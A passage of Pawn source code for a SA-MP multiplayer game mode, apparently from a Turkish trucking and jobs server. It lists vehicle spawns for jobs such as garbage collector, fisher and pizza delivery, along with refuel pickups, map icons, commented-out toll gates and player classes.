	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1769.8950000,-1554.5768000,21.9000000,89.7470000,19,69,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1769.7644000,-1565.7657000,21.9000000,89.7470000,19,69,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1768.8943000,-1588.6931000,21.9000000,268.4970000,19,69,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

/*
Objects converted: 0
Vehicles converted: 16
Vehicle models found: 1
----------------------
In the time this conversion took to finish 0.01 micro-fortnights have passed!
*/
}

//Bankaci
GameModeInit_Banka()
{
	LastVehicleID = Vehicle_AddStatic(428,-2429.6001000,515.5999800,30.2000000,214.0000000,147,163,600); //Securicar
	LastVehicleID = Vehicle_AddStatic(428,-2425.3000000,518.2000100,30.2000000,223.9970000,147,163,600); //Securicar
	LastVehicleID = Vehicle_AddStatic(428,-2422.0000000,521.5999800,30.2000000,227.7450000,147,163,600); //Securicar
	LastVehicleID = Vehicle_AddStatic(428,-2418.7000000,524.9000200,30.2000000,229.9910000,147,163,600); //Securicar
	LastVehicleID = Vehicle_AddStatic(428,-2443.3000000,509.7999900,30.2000000,190.4940000,147,163,600); //Securicar
	LastVehicleID = Vehicle_AddStatic(428,-2439.6001000,501.2000100,30.2000000,206.4920000,147,163,600); //Securicar

/*
Objects converted: 0
Vehicles converted: 6
Vehicle models found: 1
----------------------
In the time this conversion took to finish 0.01 micro-fortnights have passed!
*/
}

//Bankaci
GameModeInit_Fire()
{
	LastVehicleID = Vehicle_AddStatic(407,1770.8000000,2077.5000000,11.2000000,180.2420000,45,92,600); //Firetruck
	LastVehicleID = Vehicle_AddStatic(407,1775.0000000,2077.3999000,11.2000000,180.2420000,45,92,600); //Firetruck
	LastVehicleID = Vehicle_AddStatic(407,1749.1000000,2077.3000000,11.2000000,178.9950000,45,92,600); //Firetruck
	LastVehicleID = Vehicle_AddStatic(407,1744.8000000,2077.6001000,11.2000000,178.9950000,45,92,600); //Firetruck
	LastVehicleID = Vehicle_AddStatic(407,1094.6000000,-1248.6000000,16.2000000,0.0000000,45,92,600); //Firetruck
	LastVehicleID = Vehicle_AddStatic(407,1098.9000000,-1248.5000000,16.2000000,0.0000000,45,92,600); //Firetruck
	LastVehicleID = Vehicle_AddStatic(407,1103.4004000,-1248.5996000,16.2000000,0.0000000,45,92,600); //Firetruck
	LastVehicleID = Vehicle_AddStatic(407,1087.9000000,-1226.6000000,16.2000000,269.9960000,45,92,600); //Firetruck
	LastVehicleID = Vehicle_AddStatic(407,1088.1000000,-1230.6000000,16.2000000,269.9950000,45,92,600); //Firetruck

/*
Objects converted: 0
Vehicles converted: 9
Vehicle models found: 1
----------------------
In the time this conversion took to finish light could have travelled around the world 0.06 times!
*/

}

GameModeInit_Gemici()
{
	LastVehicleID = Vehicle_AddStatic(484,-3132.0054000,219.5071000,0.4681000,94.9650000,42,119,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,-3133.1494000,229.2731000,-0.0199000,94.5430000,42,119,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,-3131.4004000,209.6952000,0.3031000,94.5110000,42,119,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,-3127.7375000,159.5745000,-0.0025000,93.9980000,42,119,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,-3127.9626000,147.7558000,0.2417000,93.6040000,42,119,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,-3127.8921000,139.5402000,0.0589000,96.1610000,42,119,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,907.3690000,597.3232000,0.1764000,104.6910000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,876.1369000,589.3632000,0.2672000,102.4690000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,838.8669000,579.5262000,0.2295000,103.9810000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,2621.4468000,-2581.2324000,0.1007000,269.5800000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,2621.8938000,-2567.2231000,0.3099000,269.8880000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,2621.7192000,-2588.7131000,0.2228000,269.9520000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,2620.4839000,-2630.9753000,0.0539000,271.8900000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,2621.6416000,-2638.5647000,0.0200000,270.4150000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,2621.1921000,-2649.8167000,0.1271000,271.5940000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,-3268.0371000,2386.0332000,0.1164000,272.9500000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,-3268.6477000,2378.2263000,0.4964000,270.0440000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,-3268.7722000,2315.2026000,-0.4176000,270.8310000,45,92,600); //Marquis
	LastVehicleID = Vehicle_AddStatic(484,-3268.5898000,2307.5801000,-0.2950000,272.2360000,45,92,600); //Marquis

/*
Objects converted: 0
Vehicles converted: 19
Vehicle models found: 1
----------------------
In the time this conversion took to finish light could have travelled around the world 0.07 times!
*/
}

GameModeInit_Oduncu()
{
	LastVehicleID = Vehicle_AddStatic(422,-542.0408000,-98.8957000,63.3656000,358.2911000,11,195,600); //Bobcat
	LastVehicleID = Vehicle_AddStatic(422,-546.0878000,-98.7092000,63.4933000,357.9108000,11,195,600); //Bobcat
	LastVehicleID = Vehicle_AddStatic(422,-550.1564000,-98.6125000,63.6275000,357.1934000,11,195,600); //Bobcat
	LastVehicleID = Vehicle_AddStatic(422,-531.4901000,-102.9873000,63.2809000,271.7678000,11,195,600); //Bobcat
	LastVehicleID = Vehicle_AddStatic(422,-536.4714000,-74.4694000,62.8472000,269.5168000,11,195,600); //Bobcat
	LastVehicleID = Vehicle_AddStatic(422,-531.5916000,-61.1201000,62.9779000,269.6613000,11,195,600); //Bobcat
	LastVehicleID = Vehicle_AddStatic(422,-551.7641000,-76.9493000,63.2502000,180.9813000,11,195,600); //Bobcat
	LastVehicleID = Vehicle_AddStatic(422,-555.9625000,-76.9400000,63.7786000,180.8527000,11,195,600); //Bobcat
	LastVehicleID = Vehicle_AddStatic(422,-503.4707000,-76.9110000,61.7729000,358.3547000,11,195,600); //Bobcat
	LastVehicleID = Vehicle_AddStatic(422,-505.8472000,-95.2577000,62.5719000,357.1976000,11,195,600); //Bobcat

/*
Objects converted: 0
Vehicles converted: 10
Vehicle models found: 1
----------------------
convertFFS converted your input in 0.01 seconds - Chuck Norris could have done it in 0.0001 seconds!
*/

    Oduncu_LoadMissionPlace();
}

GameModeInit_Balikci()
{
	LastVehicleID = Vehicle_AddStatic(453,2496.5645000,-2756.4595000,-0.4239000,175.5800000,45,92,600); //Reefer
	LastVehicleID = Vehicle_AddStatic(453,2486.2153000,-2756.1345000,-0.0189000,181.2010000,45,92,600); //Reefer
	LastVehicleID = Vehicle_AddStatic(453,2504.3845000,-2757.0098000,-0.0840000,178.0410000,45,92,600); //Reefer
	LastVehicleID = Vehicle_AddStatic(453,-3012.0837000,385.0545000,-0.3051000,4.3020000,42,119,600); //Reefer
	LastVehicleID = Vehicle_AddStatic(453,-3004.2083000,385.2950000,-0.7591000,2.3930000,42,119,600); //Reefer
	LastVehicleID = Vehicle_AddStatic(453,-2993.7173000,384.7964000,-0.2910000,359.8120000,42,119,600); //Reefer
	LastVehicleID = Vehicle_AddStatic(453,917.9695000,675.6722000,-0.3225000,193.0930000,45,92,600); //Reefer
	LastVehicleID = Vehicle_AddStatic(453,922.0232000,662.5615000,-0.3581000,196.3300000,45,92,600); //Reefer
	LastVehicleID = Vehicle_AddStatic(453,925.5294000,647.9586000,-0.3794000,196.1420000,45,92,600); //Reefer

/*
Objects converted: 0
Vehicles converted: 9
Vehicle models found: 1
----------------------
In the time this conversion took to finish the US national debt has risen by about $578.14!
*/

    Balikci_LoadMissionPlace();
}
//pizzaboy
GameModeInit_Pboy()

{

	LastVehicleID = Vehicle_AddStatic(VehiclePboy, 2096.5139, -1794.1666, 12.9888, 87.4861, 17, 17, 600); //

	LastVehicleID = Vehicle_AddStatic(VehiclePboy, 2096.5713, -1797.1855, 12.9861, 90.7664, 17, 17, 600); //

	LastVehicleID = Vehicle_AddStatic(VehiclePboy, 2096.6965, -1800.5247, 12.9792, 88.7354, 17, 17, 600); //

	LastVehicleID = Vehicle_AddStatic(VehiclePboy, 2096.7354, -1816.7987, 12.9743, 90.7613, 17, 17, 600); //

	LastVehicleID = Vehicle_AddStatic(VehiclePboy, 2096.4224, -1819.9376, 12.9800, 91.1479, 17, 17, 600); //
	// Pizza lv ls
    LastVehicleID = Vehicle_AddStatic(VehiclePboy,-1720.3000000,1352.6000000,6.8000000,133.9950000,132,4, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,-1719.0000000,1350.9000000,6.8000000,133.9950000,132,4, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,-1717.4000000,1349.3000000,6.8000000,133.9950000,132,4, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,-1715.8000000,1347.6000000,6.8000000,133.9950000,132,4, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,-1714.3000000,1345.7000000,6.8000000,133.9950000,132,4, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,-1712.9000000,1344.2000000,6.8000000,133.9950000,132,4, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,-1721.8000000,1354.0000000,6.8000000,133.9950000,132,4, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,-1723.5000000,1355.5000000,6.8000000,133.9950000,132,4, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,2076.3000000,2226.2000000,10.5000000,184.0000000,170,-1, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,2074.2000000,2226.0000000,10.5000000,183.9990000,170,-1, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,2072.2000000,2226.5000000,10.5000000,183.9990000,170,-1, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,2069.5000000,2226.3999000,10.5000000,183.9990000,170,-1, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,2066.8999000,2226.3999000,10.5000000,183.9990000,170,-1, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,2080.3999000,2222.3999000,10.5000000,267.9990000,170,-1, 600); //Pizzaboy
	LastVehicleID = Vehicle_AddStatic(VehiclePboy,2084.1001000,2222.3000000,10.5000000,267.9950000,170,-1, 600); //Pizzaboy

	//bensonlar
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,2121.3000000,-1782.6000000,13.5000000,0.0000000,82,86,600); //Benson
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,2114.7000000,-1782.1000000,13.5000000,0.0000000,82,86,600); //Benson
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,2108.8000000,-1782.1000000,13.5000000,0.0000000,82,86,600); //Benson
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,2102.5000000,-1782.1000000,13.5000000,0.0000000,82,86,600); //Benson
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,-1731.7000000,1362.7000000,7.3000000,48.0000000,77,50,600); //Benson
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,-1738.8000000,1368.7000000,7.3000000,47.9990000,77,50,600); //Benson
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,-1745.6000000,1374.9000000,7.3000000,47.9990000,77,50,600); //Benson
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,-1720.0000000,1366.0000000,7.3000000,135.9990000,77,50,600); //Benson
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,2091.6001000,2205.6001000,10.9000000,268.0000000,132,148,600); //Benson
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,2082.1001000,2205.8000000,10.9000000,267.9950000,132,148,600); //Benson
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,2072.6001000,2206.0000000,10.9000000,267.9950000,132,148,600); //Benson
	LastVehicleID = Vehicle_AddStatic(VehicleBenson,2063.7000000,2205.7000000,10.9000000,267.9950000,132,148,600); //Benson



}

// Kargocu
GameModeInit_Kargocu()
{
    LastVehicleID = Vehicle_AddStatic(482,-2800.9043000,-988.6208000,9.8933000,-60.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2791.0405000,-1006.2419000,9.8933000,-60.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2783.4534000,-1019.1777000,9.8933000,-60.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2805.9556000,-980.0209000,9.8933000,-60.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2811.0845000,-971.4461000,9.8933000,-60.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2793.6941000,-1001.7576000,9.8933000,-60.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2760.5857000,-947.7001000,9.8933000,-174.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2756.2908000,-945.4601000,9.8933000,-174.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2723.7102000,-925.9245000,9.8933000,-174.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2715.9700000,-921.4861000,9.8933000,-174.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2711.7898000,-919.2360000,9.8933000,-174.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2704.2834000,-914.4009000,9.8933000,-174.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,-2748.5544000,-940.5116000,9.8933000,-174.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,1811.9913000,-1395.1206000,13.3904000,-158.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,1817.4336000,-1395.2622000,13.3904000,-158.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,1822.7357000,-1395.3645000,13.3904000,-158.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,1827.8142000,-1395.0884000,13.3904000,-158.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,1833.1108000,-1395.0182000,13.3904000,-158.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,1805.6926000,-1434.1116000,13.3904000,-270.0000000,-1,-1,600); //Burrito
	LastVehicleID = Vehicle_AddStatic(482,1809.8031000,-1430.3429000,13.3904000,-270.0000000,-1,-1,600); //Burrito
}

// Add some special pickups to the map
GameModeInit_PickupsIcons()
{
	// Add a pickup so the player can get a trucker/busdriver license and position a 3DTextLabel above it
	Pickup_License = CreatePickup(1274, 1, -2033.0, -100.0, 35.2, 0);
	Create3DTextLabel(TXT_PickupText, 0x008080FF, -2033.0, -100.0, 36.0, 30.0, 0);

	// Add all refuel-pickups to the world (including their icon)
	AddRefuelPickup(-1471.5, 1863.75, 32.7);
	AddRefuelPickup(-1326.5, 2677.5, 50.1);
	AddRefuelPickup(611.5, 1694.5, 7.0);
	AddRefuelPickup(-2249.25, -2559.0, 32.0);
	AddRefuelPickup(-1606.5, -2714.0, 48.6);
	AddRefuelPickup(-93.5, -1175.0, 2.3);
	AddRefuelPickup(1377.5, 457.0, 19.9);
	AddRefuelPickup(651.5, -565.5, 16.4);
	AddRefuelPickup(-1675.75, 412.75, 7.2);
	AddRefuelPickup(-2405.50, 976.25, 45.3);
	AddRefuelPickup(-2023.25, 156.75, 28.9);
	AddRefuelPickup(-1131.75, -204.25, 14.2);
	AddRefuelPickup(66.50, 1220.50, 18.9);
	AddRefuelPickup(350.50, 2537.50, 16.8);
	AddRefuelPickup(2147.00, 2747.75, 10.9);
	AddRefuelPickup(2639.75, 1106.00, 10.9);
	AddRefuelPickup(2115.00, 920.00, 10.9);
	AddRefuelPickup(2202.00, 2475.00, 10.9);
	AddRefuelPickup(1596.50, 2199.75, 10.9);
	AddRefuelPickup(1584.25, 1448.25, 10.9);
	AddRefuelPickup(1004.25, -940.50, 42.2);
	AddRefuelPickup(1935.00, -1772.75, 13.4);
	AddRefuelPickup(3628.0444, -205.6292, 4.3281); // ""
	AddRefuelPickup(638.0820, -2969.1702, 13.0000); //ist city
	AddRefuelPickup(3554.5361, 4364.2466, 10.4847); //ist city
	AddRefuelPickup(3556.4661, 4416.3628, 10.4847); //ist city
	AddRefuelPickup(3995.6501, -2234.7234, 12.7000); // feriadasi benzlik
	AddRefuelPickup(4290.2461, 2699.7896, 17.8392); // diver girisbenzilk
    AddRefuelPickup(5613.4375, 2723.7266, 16.1461); // diver cikisbenzilk
    AddRefuelPickup(-3396.3345, -5185.5195, 53.2366); //longway benzin
    AddRefuelPickup(-3442.0354, -5148.4805, 52.5631); // longway benizn
    AddRefuelPickup(-3392.3782, -4151.7920, 49.9828); // longway bwnizn
    AddRefuelPickup(-3369.0339, -4091.4072, 50.4828); // longway benizn
    AddRefuelPickup(1641.7140, 129.5565, 39.1134); // lbenzlik by tugo
	AddRefuelPickup(1968.1825, -2401.1086, 13.5469); // ls airpot benzin
    AddRefuelPickup(-277.7889, -702.2560, 7.1687); // tugi airport
    AddRefuelPickup(-2370.6025, 1799.0200, 6.0875); // baysideint 3airpot
    AddRefuelPickup(2493.6162,806.6873,10.8335);  // lv 4dragon çaprazý
    AddRefuelPickup(-3449.4370,2146.9324,29.1344); // Kastamonu Benzinlik 1
    AddRefuelPickup(-3645.1409,2203.7571,29.1266); // Kastamonu Benzinlik 2
    AddRefuelPickup(-4613.4614,793.0789,46.2469); // Kastamonu Benzinlik 3
    AddRefuelPickup(395.4265,-3963.8677,4.3688); // Antalya Benzinlik 1
    AddRefuelPickup(-139.0389,-3661.6780,50.3688); // Antalya Benzinlik 2


    AddRefuelPickup(-4613.4614,793.0789,46.2469); // Kastamonu Benzinlik 3

    // Add all pickups for the cardealers (including their icon)
	AddCarDealerPickup(-1972.5, 288.5, 35.2); // Wang cars in Doherty (San Fierro)

	// Add all pickups for the cardealers (including their icon)
	AddRefuelPickup(4063.0745,-3583.7644,12.6687); // Yeni Madison Benzinlik
	AddRefuelPickup(3995.5034,-3634.6370,12.6687); // Yeni Madison Benzinlik
	AddRefuelPickup(3470.3359,-3042.6509,12.7688); // Yeni Madison Benzinlik
	AddRefuelPickup(3470.7288,-2985.7383,12.7788); // Yeni Madison Benzinlik
	AddRefuelPickup(3470.7288,-2985.7383,12.7788); // Yeni Madison Benzinlik

	AddRefuelPickup(3105.5466,-758.7072,11.0387); // Yeni Tugis Island Benzinlik
	AddRefuelPickup(3106.9270,-810.8464,11.0387); // Yeni Tugis Island Benzinlik
	AddRefuelPickup(4661.2559,568.5810,11.1687); // Yeni Tugis Island Benzinlik

	AddRefuelPickup(-1264.7410,3794.2476,110.3768); // emkatu ada
	AddRefuelPickup(-1321.0734,3802.9683,110.3828); // emkatu ada

	AddRefuelPickup(-2614.1995,3388.0188,138.3000); // tugayogullari

	AddRefuelPickup(2793.1934,-3518.9902,23.7687); // Konya

	AddRefuelPickup(-3926.36, -2660.12,   11.34); // Ankara

	AddRefuelPickup(-4592.16, -443.90,   47.77); // Düzce

	// Add some icons to the map (modding garages), they will only appear when the player discovers them
	CreateDynamicMapIcon(1039, -1032, 32, 27, 0, 0, 0, -1, 150.0); // Transfender, Los Santos
	CreateDynamicMapIcon(-1936, 235, 34, 27, 0, 0, 0, -1, 150.0); // Transfender, San Fierro
	CreateDynamicMapIcon(2385, 1034, 11, 27, 0, 0, 0, -1, 150.0); // Transfender, Las Venturas
	CreateDynamicMapIcon(2646, -2025, 14, 27, 0, 0, 0, -1, 150.0); // Loco Low Co, Los Santos
	CreateDynamicMapIcon(-2712, 218, 4, 27, 0, 0, 0, -1, 150.0); // Wheel Arch Angels, San Fierro
}



// This function creates all objects required for the toll-gates
GameModeInit_Toll()
{
	// Add toll-houses to the world
	//CreateObject(9623, 1787.00, 695.50, 17.40, -3.5, 0.0, 350.25); //object(toll_sfw) (1)
	// Add a toll-gate to the world
/*	AddTollGate(3578, 1801.00, 692.66, 10.00, 1801.00, 692.66, 15.00, 0.0, 0.0, 350.25, 30);
	AddTollGate(3578, 1791.33, 694.44, 10.00, 1791.33, 694.44, 15.00, 0.0, 0.0, 350.25, 30);
	AddTollGate(3578, 1781.66, 696.22, 10.00, 1781.66, 696.22, 15.00, 0.0, 0.0, 350.25, 30);
	AddTollGate(3578, 1772.00, 698.00, 10.00, 1772.00, 698.00, 15.00, 0.0, 0.0, 350.25, 30);

	AddTollGate(3578, -2668.25, 1274.50, 50.0, -2668.25, 1274.50, 55.0, 0.0, 0.0, 0.0, 30);
	AddTollGate(3578, -2677.75, 1274.50, 50.0, -2677.75, 1274.50, 55.0, 0.0, 0.0, 0.0, 30);
	AddTollGate(3578, -2686.25, 1274.50, 50.0, -2686.25, 1274.50, 55.0, 0.0, 0.0, 0.0, 30);
	AddTollGate(3578, -2694.75, 1274.50, 50.0, -2694.75, 1274.50, 55.0, 0.0, 0.0, 0.0, 30);
*/
/*	AddTollGate(-1138.1000000, 1109.3000000, 37.2000000, 0.0000000, 0.0000000, 317.2500000, 100);// sf
	AddTollGate(-1131.0000000, 1102.2000000, 37.2000000, 0.0000000, 0.0000000, 135.2470000, 100);// sf
	//AddTollGate(1627.5000000, -10.0000000, 35.7000000, 0.0000000, 0.0000000, 204.7470000, 100); // ls lv arasi
	//AddTollGate(1647.1000000,-14.8000000, 35.7000000, 0.0000000, 0.0000000, 20.2470000, 100);//lslv
	//AddTollGate(520.2999900, 700.7999900, 2.6000000, 0.0000000, 0.0000000, 61.9960000, 100); //object(bar_gatebar01) (3) lv
	AddTollGate(513.7999900, 686.7999900, 2.6000000, 0.0000000, 0.0000000, 245.9960000, 100); //object(bar_gatebar01) (4)
	//AddTollGate(533.7000100, 696.5999800, 2.6000000, 0.0000000, 0.0000000, 241.4960000, 100); //object(bar_gatebar01) (5)
	AddTollGate(541.0999800, 710.5000000, 2.6000000, 0.0000000, 0.0000000, 61.4850000, 100); //object(bar_gatebar01) (6)lv hier bis
	AddTollGate(-1931.1000000, 2607.3000000, 46.2000000, 0.0000000, 0.0000000, 276.0000000, 100); //sf giereken tünncel
	AddTollGate(-5.4000000, -1527.4000000, 1.6000000, 0.0000000, 0.0000000, 253.2500000, 100); //ls igerken
	AddTollGate(10.2000000, -1515.8000000, 2.5000000, 0.0000000, 0.0000000, 75.2460000, 100);//ls girekren
	AddTollGate(-2665.0000000, 1269.1000000, 54.5000000, 0.0000000, 0.0000000, 0.0000000, 100);//sf kirmiz
	AddTollGate(-2680.3000000, 1269.1000000, 54.5000000, 0.0000000, 0.0000000, 179.7500000, 100);//sf kirmiz
	AddTollGate(-2697.8999000, 1281.0000000, 54.5000000, 0.0000000, 0.0000000, 177.7470000, 100);//sf kirmiz
	AddTollGate(-2682.8999000, 1280.5000000, 54.5000000, 0.0000000, 0.0000000, 358.7420000, 100);//sf kirmiz
	AddTollGate(2107.7000000, 305.5000000, 33.2000000, 0.0000000, 0.0000000, 276.0000000, 100); // lv ls arasi tren yolu ora
	AddTollGate(2120.3000000, 326.6000100, 33.2000000, 0.0000000, 0.0000000, 93.9990000, 100); //

	AddTollGate(1501.1000000,638.2999900,9.9000000,0.0000000,0.0000000,0.0000000, 100); // Gameroðlu Ev
	AddTollGate(1485.2000000,628.0000000,9.9000000,0.0000000,0.0000000,179.7500000, 100); // Gameroðlu Ev

	AddTollGate(2499.1001000,-2220.1001000,12.4000000,0.0000000,0.0000000,89.4970000,120); //// FERIBOT
	AddTollGate(2493.1001000,-2233.8000000,12.4000000,0.0000000,0.0000000,269.7500000,120); //// FERIBOT
	//polat ev
	AddTollGate(-1179.25110, -995.91577, 128.21135, 0.00000, 0.00000, 268.62796, 50);
	AddTollGate(-1191.63782, -987.06885, 128.21135, 0.00000, 0.00000, 271.05835, 50);
	//arda ev
	AddTollGate(1901.0006100,2624.0620100,9.8128000,0.0000000,0.0000000,90.0000000, 50); //
	AddTollGate(1912.8985600,2607.1743200,9.8128000,0.0000000,0.0000000,270.0000000, 50); //
	//arda ev 2
	AddTollGate(2621.7553700,1211.7241200,9.8499000,0.0000000,0.0000000,90.0000000, 50); //
	AddTollGate(2633.5481000,1194.7718500,9.8499000,0.0000000,0.0000000,270.0000000, 50);*/ //
}


// Add character models to the class-selection and set their default spawn coordinates (without weapons)
GameModeInit_Classes()
{
/*
	AddPlayerClass(46, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 0 = Truck driver
	AddPlayerClass(60, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 1 = Truck driver
	AddPlayerClass(73, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 2 = Truck driver
	AddPlayerClass(121, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 3 = Truck driver
	AddPlayerClass(170, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 4 = Truck driver
	AddPlayerClass(179, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 5 = Truck driver
	AddPlayerClass(198, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 6 = Truck driver
	AddPlayerClass(242, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 7 = Truck driver

	AddPlayerClass(255, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 8 = Bus driver
	AddPlayerClass(253, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 9 = Bus driver

	AddPlayerClass(61, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 10 = Pilot

	AddPlayerClass(280, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 11 = Police
	AddPlayerClass(306, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 12 = Police
	AddPlayerClass(283, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 13 = Police

	AddPlayerClass(111, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 14 = Mafia
	AddPlayerClass(112, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 15 = Mafia
	AddPlayerClass(113, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 16 = Mafia

	AddPlayerClass(16, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 17 = Roadworker
	AddPlayerClass(27, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 18 = Roadworker
	AddPlayerClass(260, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 19 = Roadworker

	AddPlayerClass(61, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 20 = Gemici

	AddPlayerClass(44, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 21 = Oduncu

	AddPlayerClass(34, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 22 = Balikci

	AddPlayerClass(8, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 23 = copcu

	AddPlayerClass(137, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 24 = copcu

